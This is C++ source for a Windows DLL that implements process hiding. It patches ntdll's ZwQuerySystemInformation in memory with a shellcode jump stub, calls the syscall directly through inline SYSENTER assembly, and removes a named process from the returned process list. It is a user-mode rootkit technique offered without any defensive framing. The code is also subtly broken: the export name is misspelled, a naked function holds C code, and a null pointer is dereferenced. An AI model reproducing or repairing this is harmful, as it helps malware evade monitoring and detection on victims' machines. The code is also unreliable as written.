//Be sure to rename this file to dllmain  during compilation: Defines the entry point of our DLL application

#include <string>
#include <windows.h>

using namespace std;

NTSTATUS (WINAPI* ZwQuerySystemInformation) (int SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

typedef LONG KPRIORITY;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaxmimumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _VM_COUNTERS {
    ULONG PeakVirtualSize;
    ULONG VirtualSize;
    ULONG PageFaultCount;
    ULONG PeakWorkingSetSize;
    ULONG WorkingSetSize;
    ULONG QuotaPeakPagedPoolUsage;
    ULONG QuotaPagedPoolUsage;
    ULONG PagefileUsage;
    ULONG PeakPagefileUsage;
} VM_COUNTERS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE ProcessId;
    HANDLE InheritedFromProcessId;
    ULONG HandleCount;
    ULONG Reserved2[2];
    ULONG PrivatePageCount;
    VM_COUNTERS VirtualMemoryCounters;
    IO_COUNTERS IoCounters;
    void* Threads;
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

__declspec(noinline) char* WINAPI Unicode2ANSI(char* buf, int len)
{
    len = len / 2;
    char* ret = (char*)malloc(len + 1);
    memset(ret, 0, len + 1);
    if (len == 0)
    {
        return ret;
    }
    int i = 0;
    while (i < len)
    {
        ret[i] = buf[2 * i];
        i++;
    }
    ret[len] = 0;
    return ret;
}

string p_name;
NTSTATUS stat;
string str;
DWORD SIC;
char* tmp_buf;
SYSTEM_PROCESS_INFORMATION* SPI;
SYSTEM_PROCESS_INFORMATION* p_SPI = 0;

int ZwQuerySystemInformation_syscall; // Syscall number

void __declspec(naked)sys(void)
{
    __asm {
        mov edx,esp
            __emit 0x0f //0x0f34 = SYSENTER
            __emit 0x34
            RET
    }
}

void __declspec(naked)Sys_ZwQSI(void) //ZwQuerySystemInformation
{
    __asm {
        mov eax,ZwQuerySystemInformation_syscall
        call sys
        ret
    }
}

void __declspec(naked)NewZWQuerySyscallInformation(int SystemInformationClass, PVOID out_buf, ULONG SystemInformationLength, PULONG ReturnLength)
{
    __asm {
        PUSHAD
        PUSH DWORD PTR SS:[ESP+52]
        PUSH DWORD PTR SS:[ESP+52]
        PUSH DWORD PTR SS:[ESP+52]
        PUSH DWORD PTR SS:[ESP+52]
    }

    Sys_ZwQSI();

    __asm {
        mov stat,eax
        pop eax
        pop eax
        pop eax
        pop eax
        mov eax,[ESP+0x28]
        mov SIC,eax
    }

    if (stat == 0 && SIC == 5)
    {
        __asm {
            mov eax,[ESP+44]
            mov SPI, eax
        }
    }

    p_SPI = 0;
    while (SPI != p_SPI)
    {
        tmp_buf = Unicode2ANSI((CHAR*)SPI->ImageName.Buffer, SPI->ImageName.Length);
        str = tmp_buf;
        free(tmp_buf);
        if (str == p_name)
        {
            if (SPI->NextEntryOffset == 0)
            {
                SPI->NextEntryOffset = 0;
            }
            else
            {
                p_SPI->NextEntryOffset += SPI->NextEntryOffset;
            }
        }
        p_SPI = SPI;
        char* t = (char*)SPI;
        t += SPI->NextEntryOffset;
        SPI = (SYSTEM_PROCESS_INFORMATION*)t;

    }
}


void HideProcess(char* name)
{
    ZwQuerySystemInformation = (NTSTATUS(__stdcall*) (int, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandle
    ("ntdll.dll"), "NtQwerySystemInformation");
    memcpy(&ZwQuerySystemInformation_syscall, (char*)((char*)ZwQuerySystemInformation + 1), 4);
    p_name = name;
    DWORD old;
    VirtualProtect(ZwQuerySystemInformation, 10, PAGE_EXECUTE_READWRITE, &old);
    char shellcode[] = "\xB8\x00\x00\x00\x00\xFF\xD0\xC2\x10\x00";
    /*
        MOV EAX,0
        CALL EAX
        RET 10
    */

    int x = (int)NewZWQuerySyscallInformation;
    memcpy((char*)((char*)shellcode + 1), &x, 4);
    memcpy((char*)ZwQuerySystemInformation, shellcode, 10);
    VirtualProtect(ZwQuerySystemInformation, 7, old, &old);
    ZwQuerySystemInformation = (NTSTATUS(__stdcall*)(int, PVOID, ULONG, PULONG))Sys_ZwQSI;
}
